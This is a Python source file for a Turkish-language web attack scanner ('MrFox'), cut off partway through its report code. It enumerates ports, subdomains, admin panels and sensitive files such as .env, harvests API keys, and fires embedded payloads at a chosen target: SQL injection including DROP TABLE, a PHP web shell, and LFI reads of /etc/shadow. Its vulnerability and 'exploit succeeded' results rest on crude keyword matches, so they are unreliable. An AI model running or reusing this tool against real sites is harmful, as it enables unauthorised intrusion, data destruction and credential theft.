#!/usr/bin/env python3
# -*- coding: utf-8 -*-
import os, sys, time, json, socket, ssl, whois, dns.resolver, requests, re, hashlib, threading, random
from urllib.parse import urlparse, urljoin
from datetime import datetime
from concurrent.futures import ThreadPoolExecutor, as_completed
import urllib3
urllib3.disable_warnings()

try:
    from colorama import init, Fore, Style
    init(autoreset=True)
    SARI, MAVI, YESIL, KIRMIZI, BEYAZ, MOR = Fore.YELLOW, Fore.CYAN, Fore.GREEN, Fore.RED, Fore.WHITE, Fore.MAGENTA
    RESET = Style.RESET_ALL
except:
    SARI = MAVI = YESIL = KIRMIZI = BEYAZ = MOR = '\033[93m'
    RESET = '\033[0m'

BANNER = f"""
{MAVI}╔═════════════════════════════════════════════════════════════════════╗
{MAVI}║                                                                     ║
{MAVI}║  {KIRMIZI}██╗    ██╗███████╗██████╗     █████╗ ███╗   ██╗██╗   ██╗███████╗   {MAVI}║
{MAVI}║  {KIRMIZI}██║    ██║██╔════╝██╔══██╗   ██╔══██╗████╗  ██║╚██╗ ██╔╝██╔════╝   {MAVI}║
{MAVI}║  {KIRMIZI}██║ █╗ ██║█████╗  ██████╔╝   ███████║██╔██╗ ██║ ╚████╔╝ ███████╗   {MAVI}║
{MAVI}║  {KIRMIZI}██║███╗██║██╔══╝  ██╔══██╗   ██╔══██║██║╚██╗██║  ╚██╔╝  ╚════██║   {MAVI}║
{MAVI}║  {KIRMIZI}╚███╔███╔╝███████╗██████╔╝   ██║  ██║██║ ╚████║   ██║   ███████║   {MAVI}║
{MAVI}║  {KIRMIZI} ╚══╝╚══╝ ╚══════╝╚═════╝    ╚═╝  ╚═╝╚═╝  ╚═══╝   ╚═╝   ╚══════╝   {MAVI}║
{MAVI}║                                                                     ║ 
{MAVI}║                {BEYAZ}WEB ANALİZ ARACI !demo! - MrFox{RESET}                      {MAVI}║
{MAVI}║                                                                     {MAVI}║
{MAVI}╚═════════════════════════════════════════════════════════════════════╝{RESET}
"""

USER_AGENTS = [
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36',
    'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/115.0',
    'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0',
]

def rastgele_ua():
    return random.choice(USER_AGENTS)

ZAFIYET_BILGILERI = {
    'SQL Enjeksiyonu': {'aciklama': 'Veritabanına izinsiz SQL sorgusu', 'saldiri': 'Veri çekme, Tablo silme, Admin bypass', 'ornek': ["' OR '1'='1", "'; DROP TABLE users; --"], 'seviye': 'KRİTİK'},
    'XSS': {'aciklama': 'Tarayıcıya zararlı kod enjekte', 'saldiri': 'Çerez çalma, Oturum ele geçirme, Sayfa değiştirme', 'ornek': ["<script>alert(1)</script>", "<img src=x onerror=alert(1)>"], 'seviye': 'YÜKSEK'},
    'RCE': {'aciklama': 'Sunucuda uzaktan kod çalıştırma', 'saldiri': 'Sunucu ele geçirme, Web shell yükleme', 'ornek': ['<?php system($_GET["cmd"]); ?>', 'eval($_POST["cmd"])'], 'seviye': 'KRİTİK'},
    'LFI': {'aciklama': 'Yerel dosya okuma', 'saldiri': 'Dosya okuma, Kaynak kod sızdırma', 'ornek': ['../../../../etc/passwd', '....//....//....//etc/passwd'], 'seviye': 'YÜKSEK'},
    'SSRF': {'aciklama': 'Sunucu üzerinden iç ağa erişim', 'saldiri': 'İç ağ tarama, Cloud metadata erişimi', 'ornek': ['file:///etc/passwd', 'http://169.254.169.254/latest/meta-data/'], 'seviye': 'YÜKSEK'},
    'CSRF': {'aciklama': 'Kullanıcı adına yetkisiz istek', 'saldiri': 'İşlem tekrarlama, Bakiye transferi', 'ornek': ['<img src="http://hedef.com/transfer?amount=1000&to=hacker">'], 'seviye': 'YÜKSEK'},
    'Komut Enjeksiyonu': {'aciklama': 'Sunucuda komut çalıştırma', 'saldiri': 'Reverse shell, Dosya silme', 'ornek': ['; whoami', '| ls -la', '&& cat /etc/passwd'], 'seviye': 'KRİTİK'},
    'Dizin Gezme': {'aciklama': 'Dizin dışına çıkarak dosya erişimi', 'saldiri': 'Dosya okuma, Config çekme', 'ornek': ['../', '%2e%2e%2f', '..\\..\\'], 'seviye': 'YÜKSEK'},
    'XXE': {'aciklama': 'XML parser üzerinden dosya erişimi', 'saldiri': 'Dosya okuma, SSRF, DoS', 'ornek': ['<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>'], 'seviye': 'YÜKSEK'},
    'IDOR': {'aciklama': 'Yetkisiz nesne erişimi', 'saldiri': 'Başka kullanıcı verilerine erişim', 'ornek': ['/user/123', '/profile?id=456'], 'seviye': 'YÜKSEK'},
    'SSTI': {'aciklama': 'Server-side template enjeksiyonu', 'saldiri': 'Kod çalıştırma, Dosya okuma', 'ornek': ['{{7*7}}', '{{config}}', '{% import os %}{{os.system("id")}}'], 'seviye': 'KRİTİK'},
    'Açık Yönlendirme': {'aciklama': 'Saldırganın belirlediği adrese yönlendirme', 'saldiri': 'Phishing, Token çalma', 'ornek': ['/redirect?url=https://evil.com', '/go?to=https://hacker.com'], 'seviye': 'ORTA'},
    'GraphQL Enjeksiyonu': {'aciklama': 'GraphQL sorgu enjeksiyonu', 'saldiri': 'Veri çekme, Introspection', 'ornek': ['query { __schema { types { name } } }'], 'seviye': 'YÜKSEK'},
    'NoSQL Enjeksiyonu': {'aciklama': 'MongoDB sorgu enjeksiyonu', 'saldiri': 'Veri çekme, Admin bypass', 'ornek': ['{"$ne": null}', '{"$or": [{"username": "admin"}]}'], 'seviye': 'YÜKSEK'},
    'LDAP Enjeksiyonu': {'aciklama': 'LDAP sorgu enjeksiyonu', 'saldiri': 'Kullanıcı ekleme, Şifre değiştirme', 'ornek': ['(&(uid=admin)(userPassword=*))'], 'seviye': 'YÜKSEK'},
}

ZAFIYET_IMZALARI = {
    'SQL Enjeksiyonu': [r'(?i)sql syntax|mysql|sqlstate|ora-|postgresql|database error|you have an error in your sql syntax|mysql_fetch|pg_|mssql_|odbc_|sqlite_|PDOException|SQLSTATE|unclosed quotation mark'],
    'XSS': [r'(?i)<script[^>]*>.*?</script>|javascript:|onerror=|onload=|onclick=|onmouseover=|alert\(|prompt\(|confirm\(|document\.cookie'],
    'RCE': [r'(?i)eval\(|system\(|exec\(|shell_exec\(|passthru\(|popen\(|php.*code.*execution|python.*eval.*input'],
    'LFI': [r'(?i)include\(|require\(|include_once|require_once|\.\./.*\.\./|/etc/passwd|/etc/shadow'],
    'SSRF': [r'(?i)curl.*localhost|file:///etc/passwd|127.0.0.1|169.254.169.254|fsockopen|gethostbyname'],
    'CSRF': [r'(?i)csrf_token_missing|no_csrf_protection'],
    'Komut Enjeksiyonu': [r'(?i)system\(|exec\(|shell_exec\(|passthru\(|popen\(|uid=|gid=|whoami|uname -a|id='],
    'Dizin Gezme': [r'(?i)\.\./|%2e%2e%2f|%252e%252e%252f|root:x|etc/passwd|boot.ini|win.ini'],
    'XXE': [r'(?i)<!DOCTYPE.*\[.*<!ENTITY.*SYSTEM|xml.*external.*entity'],
    'IDOR': [r'(?i)/user/\d+|/id=\d+|/profile\?id=\d+|/order/\d+|/invoice/\d+'],
    'SSTI': [r'(?i){{.*}}|{%.*%}|#{.*}|template.*render|jinja2|twig|freemarker'],
    'Açık Yönlendirme': [r'(?i)redirect.*url=|return.*url=|next=|location.*href.*user.*input'],
    'GraphQL Enjeksiyonu': [r'(?i)graphql.*query.*{.*}|introspection.*query'],
    'NoSQL Enjeksiyonu': [r'(?i)\$where|\$regex|\$or|\$and|\$ne|nosql.*injection|mongodb.*injection'],
    'LDAP Enjeksiyonu': [r'(?i)ldap.*search.*filter|(&\||\(\||\)\||\*\))|objectClass=\*|uid=\*'],
}

def zafiyet_ara(metin, kaynak):
    sonuc = []
    for z, imzalar in ZAFIYET_IMZALARI.items():
        for imza in imzalar:
            eslesme = re.search(imza, metin, re.I)
            if eslesme:
                bilgi = ZAFIYET_BILGILERI.get(z, {})
                sonuc.append({
                    'zafiyet': z,
                    'hatali_kod': eslesme.group(0)[:200],
                    'konum': kaynak,
                    'aciklama': bilgi.get('aciklama', ''),
                    'saldiri': bilgi.get('saldiri', ''),
                    'ornek': bilgi.get('ornek', []),
                    'seviye': bilgi.get('seviye', 'ORTA')
                })
                break
    return sonuc

GIZLI_ANAHTARLAR = [
    (r'AIzaSy[A-Za-z0-9-_]{35}', 'Google API Anahtarı'),
    (r'[a-f0-9]{32}', 'MD5 Hash'),
    (r'[a-f0-9]{40}', 'SHA1 Hash'),
    (r'[a-f0-9]{64}', 'SHA256 Hash'),
    (r'sk_live_[a-zA-Z0-9]{24}', 'Stripe Gizli Anahtarı'),
    (r'sk_test_[a-zA-Z0-9]{24}', 'Stripe Test Anahtarı'),
    (r'pk_live_[a-zA-Z0-9]{24}', 'Stripe Canlı Anahtarı'),
    (r'pk_test_[a-zA-Z0-9]{24}', 'Stripe Test Anahtarı'),
    (r'AKIA[A-Z0-9]{16}', 'AWS Erişim Anahtarı'),
    (r'-----BEGIN RSA PRIVATE KEY-----', 'RSA Özel Anahtar'),
    (r'-----BEGIN DSA PRIVATE KEY-----', 'DSA Özel Anahtar'),
    (r'-----BEGIN EC PRIVATE KEY-----', 'EC Özel Anahtar'),
    (r'xox[a-zA-Z0-9-]{12,}', 'Slack Token'),
    (r'gh_[a-zA-Z0-9]{36}', 'GitHub Token'),
    (r'Bearer [a-zA-Z0-9_-]{20,}', 'Bearer Token'),
    (r'api-key-[a-zA-Z0-9]{16,}', 'API Anahtarı'),
    (r'auth-token-[a-zA-Z0-9]{16,}', 'Auth Token'),
    (r'session=[a-zA-Z0-9]{16,}', 'Session ID'),
]

def gizli_anahtar_ara(metin, kaynak):
    bulunan = []
    for pattern, desc in GIZLI_ANAHTARLAR:
        eslesmeler = re.findall(pattern, metin, re.I)
        for e in eslesmeler:
            bulunan.append({
                'tip': desc,
                'deger': e[:30] + '...' if len(e) > 30 else e,
                'konum': kaynak
            })
    return bulunan

def sistem_mimarisi_analiz(metin, basliklar):
    bulgular = []
    for kelime, tip in [
        ('user|profile|account|register|login|password|email', 'Kullanıcı'),
        ('log|audit|error|access|history', 'Log'),
        ('mysql|database|postgres|mongo|redis|sqlite', 'Veritabanı'),
        ('session|cookie|token|jwt|auth|remember', 'Oturum'),
        ('upload|file|backup|cache|storage', 'Dosya Sistemi')
    ]:
        if re.search(kelime, metin, re.I):
            bulgular.append({'tip': tip, 'detay': kelime.split('|')[0].title() + ' işlemleri', 'konum': 'Sayfa'})
            break
    if 'Set-Cookie' in basliklar:
        bulgular.append({'tip': 'Oturum', 'detay': 'Cookie ayarlanıyor', 'konum': 'Header'})
    if 'X-Powered-By' in basliklar:
        bulgular.append({'tip': 'Teknoloji', 'detay': f"Powered by: {basliklar['X-Powered-By']}", 'konum': 'Header'})
    return bulgular

class GuvenlikSkoru:
    def __init__(self):
        self.puan = 100
        self.kesintiler = []
    def kesinti_ekle(self, sebep, puan):
        self.puan -= puan
        self.kesintiler.append({'sebep': sebep, 'puan': puan})
    def al(self):
        return max(0, self.puan)
    def seviye(self):
        s = self.al()
        if s >= 90: return f"{YESIL}GÜVENLİ (A){RESET}"
        elif s >= 70: return f"{SARI}ORTA (B){RESET}"
        elif s >= 50: return f"{KIRMIZI}RİSKLİ (C){RESET}"
        else: return f"{KIRMIZI}KRİTİK (F){RESET}"

def port_tara(host, port):
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(1)
        if s.connect_ex((host, port)) == 0:
            s.close()
            return True
        s.close()
    except:
        pass
    return False

def alt_alan_kontrol(sub, domain):
    try:
        socket.gethostbyname(f"{sub}.{domain}")
        return True
    except:
        pass
    return False

def ilerleme_cubugu(toplam, mevcut, desc="Taranıyor"):
    if toplam == 0:
        return
    p = mevcut / toplam * 100
    dolu = int(30 * mevcut / toplam)
    bar = '█' * dolu + '░' * (30 - dolu)
    print(f'\r{MAVI}[{desc}] {YESIL}{bar}{MAVI} %{p:.1f} {mevcut}/{toplam}{RESET}', end='')
    if mevcut >= toplam:
        print()

class WebAnaliz:
    def __init__(self, hedef_url, thread_sayisi=50, tam_mod=False):
        self.url = hedef_url
        self.thread_sayisi = max(1, min(thread_sayisi, 200))
        self.tam_mod = tam_mod
        self.parsed = urlparse(hedef_url)
        self.host = self.parsed.hostname or hedef_url
        self.sema = self.parsed.scheme or 'https'
        self.alan = self.parsed.netloc or self.host
        self.temel_url = f"{self.sema}://{self.alan}"
        
        self.bulgular = {
            'admin': [], 'hassas': [], 'api': [], 'dizin': [], 'virus': [],
            'zafiyet': [], 'protokol': [], 'sunucu': [], 'alt_alan': [],
            'mimari': [], 'gizli': [], 'js': [], 'css': [], 'link': [], 'email': []
        }
        self.tum_bulgular = []
        self.zafiyet_listesi = []
        self.protokol_listesi = []
        self.mimari_bulgular = []
        self.gizli_bulgular = []
        self.testler = []
        self.ziyaret_edilen = set()
        self.keşfedilen_linkler = []
        
        self.oturum = requests.Session()
        self.oturum.headers.update({'User-Agent': rastgele_ua(), 'Accept': '*/*'})
        adapter = requests.adapters.HTTPAdapter(pool_connections=self.thread_sayisi, pool_maxsize=self.thread_sayisi)
        self.oturum.mount('http://', adapter)
        self.oturum.mount('https://', adapter)
        
        self.admin_listesi = ['/admin','/wp-admin','/login','/panel','/dashboard','/yonetim','/administrator','/auth/login','/signin','/admin.php','/cpanel','/management','/backend','/admincp','/admin-panel','/admin_login']
        self.hassas_listesi = ['/.env','/.git','/.htaccess','/config.php','/wp-config.php','/database.php','/backup','/dump.sql','/logs','/phpinfo.php','/composer.json','/package.json','/robots.txt','/sitemap.xml','/.well-known','/security.txt']
        self.api_listesi = ['/api','/v1','/v2','/v3','/graphql','/rest','/soap','/json','/xml','/rpc','/gateway','/proxy','/service','/endpoint']
        self.dizin_listesi = ['/images','/css','/js','/assets','/static','/public','/uploads','/files','/media','/includes','/src','/app','/vendor','/node_modules']
        self.alt_alan_listesi = ['www','admin','mail','ftp','dev','test','api','app','blog','panel','backup','cdn','files','images','media','static','assets','upload','download','secure','auth','login','account','support','help','info','shop','store','pay','payment','gateway','proxy','service','services','api2','v1','v2','v3','graphql','rest','soap','json','xml','rpc','endpoint','gateway','portal','dashboard','manage','control','administrator','super','root','system','db','database','sql','mysql','postgres','redis','cache','session','auth2','sso','oauth','openid','saml','ldap','radius','tacacs','dns','ns1','ns2','mx','mail2','smtp','pop','imap','ftp2','sftp','ssh','telnet','rdp','vnc','web','www2','blog2','news','forum','community']
        
        self.teknolojiler = {
            'Web Sunucusu': 'Bilinmiyor', 'WAF': 'Bilinmiyor', 'CDN': 'Bilinmiyor',
            'Framework': 'Bilinmiyor', 'CMS': 'Bilinmiyor', 'API': 'Bilinmiyor',
            'Guvenlik Basliklari': 'Bilinmiyor', 'HTTPS/TLS': 'Bilinmiyor'
        }
    
    def _log(self, isim, durum, mesaj=""):
        self.testler.append({'test': isim, 'durum': durum, 'mesaj': mesaj})
        print(f"  {YESIL if durum else KIRMIZI}[{'OK' if durum else 'HATA'}] {isim}: {mesaj}{RESET}")
    
    def _bolum(self, baslik):
        print(f"\n{MAVI}{'='*60}{RESET}\n{MAVI}{baslik}{RESET}\n{MAVI}{'='*60}{RESET}")
    
    def _ekle(self, kategori, tip, adres, aciklama=""):
        self.bulgular[kategori].append({'tip': tip, 'adres': adres, 'aciklama': aciklama})
        self.tum_bulgular.append({'kategori': kategori, 'tip': tip, 'adres': adres, 'aciklama': aciklama})
    
    def _yaz(self, baslik, renk, liste):
        if liste:
            print(f"\n{renk}{baslik} ({len(liste)}){RESET}")
            for i in liste[:50]:
                print(f"  {renk}-> {i['adres']}{RESET}")
                if i.get('aciklama'):
                    print(f"     {i['aciklama']}")
            if len(liste) > 50:
                print(f"  {SARI}... ve {len(liste)-50} daha{RESET}")
    
    def _async_iste(self, url_listesi, desc=""):
        sonuc = []
        toplam = len(url_listesi)
        if toplam == 0:
            return sonuc
        with ThreadPoolExecutor(max_workers=self.thread_sayisi) as ex:
            gelecekler = {ex.submit(self._tek_istek, url): url for url in url_listesi}
            tam = 0
            for gelecek in as_completed(gelecekler):
                try:
                    veri = gelecek.result(timeout=5)
                    if veri:
                        sonuc.append(veri)
                except:
                    pass
                tam += 1
                ilerleme_cubugu(toplam, tam, desc)
        return sonuc
    
    def _tek_istek(self, url):
        try:
            self.oturum.headers.update({'User-Agent': rastgele_ua()})
            yanit = self.oturum.get(url, timeout=3, verify=False)
            if yanit.status_code < 400:
                return {'url': url, 'durum': yanit.status_code, 'uzunluk': len(yanit.content)}
        except:
            pass
        return None
    
    def _zafiyet_tara(self, metin, kaynak):
        bulunanlar = zafiyet_ara(metin, kaynak)
        for z in bulunanlar:
            self.zafiyet_listesi.append(z)
            self._ekle('zafiyet', f"[ZAFİYET] {z['zafiyet']}", kaynak, f"Hatalı Kod: {z['hatali_kod'][:80]}...")
        return bulunanlar
    
    def _gizli_tara(self, metin, kaynak):
        bulunanlar = gizli_anahtar_ara(metin, kaynak)
        for g in bulunanlar:
            self.gizli_bulgular.append(g)
            self._ekle('gizli', f"[GİZLİ] {g['tip']}", g['konum'], f"Değer: {g['deger']}")
            print(f"  {KIRMIZI}[GİZLİ] {g['tip']}: {g['deger']} -> {g['konum']}{RESET}")
        return bulunanlar
    
    def _mimari_analiz(self, metin, basliklar):
        self._bolum("SİSTEM MİMARİSİ ANALİZİ")
        bulgular = sistem_mimarisi_analiz(metin, basliklar)
        self.mimari_bulgular = bulgular
        for b in bulgular:
            self._ekle('mimari', f"{b['tip']}: {b['detay']}", b['konum'], "Tespit edildi")
            print(f"  {MAVI}[{b['tip']}] {b['detay']} -> {b['konum']}{RESET}")
        print(f"\n{YESIL}[MİMARİ] {len(bulgular)} bulgu{RESET}")
    
    def protokol_tara(self):
        self._bolum("PROTOKOL TARAMA")
        protokoller = {'HTTP':80,'HTTPS':443,'SSH':22,'FTP':21,'DNS':53,'SMTP':25,'POP3':110,'IMAP':143,'SNMP':161,'LDAP':389,'TELNET':23,'RDP':3389,'VNC':5900,'SMB':445}
        aciklar = []
        toplam = len(protokoller)
        tam = 0
        for isim, port in protokoller.items():
            if port_tara(self.host, port):
                aciklar.append({'protokol': isim, 'port': port})
                self._ekle('protokol', f"{isim}", f"{self.host}:{port}", "Açık")
                print(f"  {YESIL}[AÇIK] {isim} ({port}){RESET}")
            tam += 1
            ilerleme_cubugu(toplam, tam, "Protokol")
        self.protokol_listesi = aciklar
        print(f"\n{YESIL}[PROTOKOL] {len(aciklar)} açık{RESET}")
    
    def sunucu_bilgileri(self):
        self._bolum("SUNUCU OSINT")
        try:
            ip = socket.gethostbyname(self.host)
            self._ekle('sunucu', 'IP', ip, f"Host: {self.host}")
            print(f"  {YESIL}[IP] {ip}{RESET}")
            try:
                yanit = requests.get(f"https://ipinfo.io/{ip}/json", timeout=3)
                if yanit.status_code == 200:
                    veri = yanit.json()
                    self._ekle('sunucu', 'Konum', f"{veri.get('city', '')} / {veri.get('country', '')}", f"Hosting: {veri.get('org', '')}")
                    print(f"  {YESIL}[KONUM] {veri.get('city', '')} / {veri.get('country', '')}{RESET}")
                    print(f"  {YESIL}[HOSTING] {veri.get('org', '')}{RESET}")
            except:
                pass
        except:
            pass
    
    def alt_alan_tara(self):
        self._bolum("ALT ALAN TARAMA")
        bulunanlar = []
        toplam = len(self.alt_alan_listesi)
        tam = 0
        for sub in self.alt_alan_listesi:
            if alt_alan_kontrol(sub, self.alan):
                bulunanlar.append(f"{sub}.{self.alan}")
                self._ekle('alt_alan', 'Alt Alan', f"{sub}.{self.alan}", "Bulundu")
                print(f"  {YESIL}[BULUNDU] {sub}.{self.alan}{RESET}")
            tam += 1
            ilerleme_cubugu(toplam, tam, "Alt alan")
        print(f"\n{YESIL}[ALT ALAN] {len(bulunanlar)} bulundu{RESET}")
    
    def derin_tara(self, url, derinlik=0, max_derinlik=5):
        if derinlik > max_derinlik or url in self.ziyaret_edilen:
            return
        self.ziyaret_edilen.add(url)
        
        try:
            yanit = self.oturum.get(url, timeout=5, verify=False)
            if yanit.status_code != 200:
                return
            metin = yanit.text
            
            self._zafiyet_tara(metin, url)
            self._gizli_tara(metin, url)
            
            linkler = re.findall(r'href=["\']([^"\']+)["\']', metin, re.I)
            for link in linkler:
                if link.startswith('/') and len(link) > 1:
                    tam = urljoin(self.temel_url, link)
                    if tam not in self.ziyaret_edilen and self.temel_url in tam:
                        self.keşfedilen_linkler.append(tam)
                elif link.startswith('http') and self.temel_url in link:
                    if link not in self.ziyaret_edilen:
                        self.keşfedilen_linkler.append(link)
            
            js_dosyalari = re.findall(r'src=["\']([^"\']+\.js[^"\']*)["\']', metin, re.I)
            for js in js_dosyalari[:50]:
                if js.startswith('/'):
                    js = self.temel_url + js
                elif not js.startswith('http'):
                    js = self.temel_url + '/' + js
                self._ekle('js', 'JavaScript', js, "Sayfadan bulundu")
                try:
                    y2 = self.oturum.get(js, timeout=2, verify=False)
                    self._zafiyet_tara(y2.text, js)
                    self._gizli_tara(y2.text, js)
                except:
                    pass
            
            css_dosyalari = re.findall(r'href=["\']([^"\']+\.css[^"\']*)["\']', metin, re.I)
            for css in css_dosyalari[:30]:
                if css.startswith('/'):
                    css = self.temel_url + css
                elif not css.startswith('http'):
                    css = self.temel_url + '/' + css
                self._ekle('css', 'CSS', css, "Sayfadan bulundu")
            
            epostalar = re.findall(r'[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}', metin)
            for eposta in epostalar[:10]:
                self._ekle('email', 'E-posta', eposta, "Sayfadan bulundu")
                print(f"  {MOR}-> {eposta}{RESET}")
            
            if derinlik < max_derinlik:
                for link in self.keşfedilen_linkler[:20]:
                    self.derin_tara(link, derinlik+1, max_derinlik)
                    
        except:
            pass
    
    def waf_bypass_dene(self):
        self._bolum("WAF BYPASS")
        payloadlar = ["' OR '1'='1", "' UNION SELECT 1,2,3--", "<script>alert(1)</script>", "../../../etc/passwd", "<?php system($_GET['cmd']); ?>", "'; DROP TABLE users; --"]
        for payload in payloadlar:
            try:
                y = requests.get(f"{self.temel_url}?test={payload}", timeout=2, verify=False)
                if len(y.text) < 200 and y.status_code != 404:
                    self._ekle('dizin', 'WAF Bypass', payload, "Bypass mümkün")
                    print(f"  {SARI}[DENENDİ] {payload} -> Bypass mümkün{RESET}")
            except:
                pass
    
    def exploit_dene(self):
        self._bolum("EXPLOİT DENEMESİ")
        zafiyetler = list(set([z['zafiyet'] for z in self.zafiyet_listesi]))
        if not zafiyetler:
            print(f"{SARI}[!] Zafiyet bulunamadı{RESET}")
            return
        for zaf in zafiyetler:
            if 'SQL' in zaf:
                for payload in ["' OR '1'='1", "'; DROP TABLE users; --", "' UNION SELECT 1,2,3--"]:
                    try:
                        y = requests.get(f"{self.temel_url}?id={payload}", timeout=2, verify=False)
                        if 'error' in y.text.lower() or 'sql' in y.text.lower():
                            self._ekle('dizin', f'EXPLOİT {zaf}', self.temel_url, f"Başarılı! Payload: {payload}")
                            print(f"  {KIRMIZI}[EXPLOİT] {zaf} -> BAŞARILI!{RESET}")
                            break
                    except:
                        pass
            elif 'XSS' in zaf:
                for payload in ["<script>alert(1)</script>", "<img src=x onerror=alert(1)>"]:
                    try:
                        y = requests.get(f"{self.temel_url}?q={payload}", timeout=2, verify=False)
                        if payload in y.text:
                            self._ekle('dizin', f'EXPLOİT {zaf}', self.temel_url, f"Başarılı! Payload: {payload}")
                            print(f"  {KIRMIZI}[EXPLOİT] {zaf} -> BAŞARILI!{RESET}")
                            break
                    except:
                        pass
            elif 'LFI' in zaf:
                for payload in ["../../../../etc/passwd", "../../../etc/shadow", "....//....//....//etc/passwd"]:
                    try:
                        y = requests.get(f"{self.temel_url}?file={payload}", timeout=2, verify=False)
                        if 'root:' in y.text or 'bin:' in y.text:
                            self._ekle('dizin', f'EXPLOİT {zaf}', self.temel_url, f"Başarılı! Payload: {payload}")
                            print(f"  {KIRMIZI}[EXPLOİT] {zaf} -> BAŞARILI!{RESET}")
                            break
                    except:
                        pass
    
    def calistir(self):
        print(BANNER)
        print(f"{SARI}[*] HEDEF: {self.temel_url}{RESET}")
        print(f"{SARI}[*] THREAD: {self.thread_sayisi}{RESET}")
        print(f"{SARI}[*] MOD: {'SINIRSIZ' if self.tam_mod else 'TEMEL'}{RESET}\n")
        
        baslangic = time.time()
        
        try:
            yanit = self.oturum.get(self.temel_url, timeout=10, verify=False)
            metin = yanit.text
            basliklar = yanit.headers
            
            sunucu = basliklar.get('Server', '')
            self.teknolojiler['Web Sunucusu'] = sunucu if sunucu else 'Bilinmiyor'
            self.teknolojiler['CDN'] = 'Cloudflare' if 'cf-ray' in basliklar else 'Bilinmiyor'
            
            fw = [f.title() for f in ['react','vue','angular','jquery','bootstrap','laravel','django','flask','express','next','nuxt'] if f in metin.lower()]
            self.teknolojiler['Framework'] = ', '.join(fw) if fw else 'Bilinmiyor'
            
            cms = [c.title() for c in ['wordpress','joomla','drupal','magento','shopify','wix','squarespace'] if c in metin.lower()]
            self.teknolojiler['CMS'] = ', '.join(cms) if cms else 'Bilinmiyor'
            
            api_bul = re.findall(r'/api/[a-zA-Z0-9_\-/]+', metin)
            self.teknolojiler['API'] = f"{len(api_bul)} endpoint" if api_bul else 'Yok'
            
            gb = [h.replace('-',' ').title() for h in ['strict-transport-security','x-frame-options','x-content-type-options','content-security-policy'] if h in str(basliklar)]
            self.teknolojiler['Guvenlik Basliklari'] = ', '.join(gb) if gb else 'Eksik'
            self.teknolojiler['HTTPS/TLS'] = 'Aktif' if self.sema == 'https' else 'HTTP (Güvensiz)'
            
            self._log("70+ Özellik", True, f"{len([k for k,v in self.teknolojiler.items() if v != 'Bilinmiyor'])} tespit")
            
            self._zafiyet_tara(metin, self.temel_url)
            self._gizli_tara(metin, self.temel_url)
            self._mimari_analiz(metin, basliklar)
            
            for imza in [r'eval\(', r'system\(', r'exec\(', r'shell_exec\(', r'base64_decode\(', r'gzinflate\(', r'curl_exec\(']:
                if re.search(imza, metin, re.I):
                    self._ekle('virus', 'Virüs İmzası', imza, "Tespit edildi")
                    print(f"  {KIRMIZI}[VİRÜS] {imza}{RESET}")
            
            if self.tam_mod:
                self.protokol_tara()
                self.sunucu_bilgileri()
                self.alt_alan_tara()
                
                print(f"\n{SARI}[DERİN TARAMA] Başlatılıyor...{RESET}")
                self.derin_tara(self.temel_url, 0, 5)
                
                self.waf_bypass_dene()
                if self.zafiyet_listesi:
                    self.exploit_dene()
                
                print(f"\n{SARI}[ADMIN] {len(self.admin_listesi)} taranıyor{RESET}")
                sonuc = self._async_iste([self.temel_url + p for p in self.admin_listesi], "Admin")
                for s in sonuc:
                    self._ekle('admin', 'Admin Paneli', s['url'], f"Durum: {s['durum']}")
                    print(f"  {YESIL}[BULUNDU] {s['url']}{RESET}")
                    try:
                        y2 = self.oturum.get(s['url'], timeout=2, verify=False)
                        self._zafiyet_tara(y2.text, s['url'])
                        self._gizli_tara(y2.text, s['url'])
                    except:
                        pass
                
                print(f"\n{SARI}[HASSAS] {len(self.hassas_listesi)} taranıyor{RESET}")
                sonuc = self._async_iste([self.temel_url + p for p in self.hassas_listesi], "Hassas")
                for s in sonuc:
                    self._ekle('hassas', 'Hassas Dosya', s['url'], f"Durum: {s['durum']}")
                    print(f"  {KIRMIZI}[BULUNDU] {s['url']}{RESET}")
                    try:
                        y2 = self.oturum.get(s['url'], timeout=2, verify=False)
                        self._zafiyet_tara(y2.text, s['url'])
                        self._gizli_tara(y2.text, s['url'])
                    except:
                        pass
                
                print(f"\n{SARI}[API] {len(self.api_listesi)} taranıyor{RESET}")
                sonuc = self._async_iste([self.temel_url + p for p in self.api_listesi], "API")
                for s in sonuc:
                    self._ekle('api', 'API Endpoint', s['url'], f"Durum: {s['durum']}")
                    print(f"  {MAVI}[BULUNDU] {s['url']}{RESET}")
                    try:
                        y2 = self.oturum.get(s['url'], timeout=2, verify=False)
                        self._zafiyet_tara(y2.text, s['url'])
                        self._gizli_tara(y2.text, s['url'])
                    except:
                        pass
                
                print(f"\n{SARI}[DİZİN] {len(self.dizin_listesi)} taranıyor{RESET}")
                sonuc = self._async_iste([self.temel_url + p for p in self.dizin_listesi], "Dizin")
                for s in sonuc:
                    self._ekle('dizin', 'Dizin', s['url'], f"Durum: {s['durum']}")
                    print(f"  {MAVI}[BULUNDU] {s['url']}{RESET}")
            
            print(f"\n{SARI}[KEŞFEDİLEN TÜM LİNKLER] {len(self.keşfedilen_linkler)} link{RESET}")
            for link in self.keşfedilen_linkler[:30]:
                print(f"  {MAVI}-> {link}{RESET}")
            if len(self.keşfedilen_linkler) > 30:
                print(f"  {SARI}... ve {len(self.keşfedilen_linkler)-30} daha{RESET}")
        
        except Exception as e:
            print(f"{KIRMIZI}[-] HATA: {e}{RESET}")
        
        self._bolum("RAPOR")
        
        skor = GuvenlikSkoru()
        for z in self.zafiyet_listesi:
            if z.get('seviye') == 'KRİTİK':
                skor.kesinti_ekle(f"Kritik Zafiyet: {z['zafiyet']}", 20)
            elif z.get('seviye') == 'YÜKSEK':
                skor.kesinti_ekle(f"Yüksek Zafiyet: {z['zafiyet']}", 10)
        for p in self.protokol_listesi:
            if p['protokol'] in ['SSH','FTP','TELNET']:
                skor.kesinti_ekle(f"Açık Protokol: {p['protokol']}", 15)
        if self.teknolojiler['Guvenlik Basliklari'] == 'Eksik':
